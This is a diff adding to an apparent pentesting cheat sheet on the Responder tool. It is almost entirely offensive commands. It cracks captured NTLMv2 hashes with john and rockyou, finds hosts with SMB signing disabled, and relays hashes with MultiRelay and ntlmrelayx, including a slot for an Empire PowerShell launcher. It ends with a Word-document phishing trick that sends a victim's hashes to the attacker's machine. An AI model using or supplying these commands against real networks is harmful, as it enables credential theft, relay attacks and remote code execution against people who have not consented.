@@ -11,9 +11,48 @@
 
 # Start a MiTM attack with poisoning on all the services we see as "On"
 responder -I eth0
+;; we can crack the net-ntlmv2 creds by doing:
+;; john --format=netntlmv2 --wordlist="/usr/share/wordlists/rockyou.txt" hash.txt 
+;; it's adviceable to also use the OneRuleToRuleThemAll ruleset.
 
 # Typical suggested usage
 responder -I eth0 -rPv
 
 # Start a MiTM attack and enable WPAD server
 responder -I eth0  -wrf
+
+
+# Responder in Relaying Attacks
+You can link responder and multi relay to own machines
+;; It's important to know that SMB Signing must be disabled on machines for multirelay.
+;; SMB Server must also be off on Responder. Responder will intercept and MultiRelay will relay hashes
+ 
+;; HTTP and SMB are OFF in Responder.conf
+responder -I eth0 -rv
+responder -I <interface> -r -d -w
+
+
+;; You can check for machines with disabled SMB Signing with RunFinger (impacket) or CrackMapExec
+python RunFinger.py -i 10.0.2.0/24
+cme smb <CIDR> --gen-relay-list targets.txt
+
+;; Then you will target one machine or one range for MultiRelay
+python MultiRelay.py -t 10.0.2.4 -u ALL
+ntlmrelayx.py -tf targets.txt
+ntlmrelayx.py -tf targets.txt -c <insert your Empire Powershell launcher here>
+
+
+
+## Phishing with Responder
+We can craft office documents with images
+whose content has to be gathered on the attacking
+machine.
+So that when the user tries to open our document
+he sends its hashes to us.
+The procedure is simple:
+    Open Word -> CTRL + F9
+    IMPORT "\\\\Responder-IP\\1.jpg"
+    Right click and select "Edit Field"
+    Tick "Data not stored in document"
+    Save & close.
+    Open the document -> free credentials :)
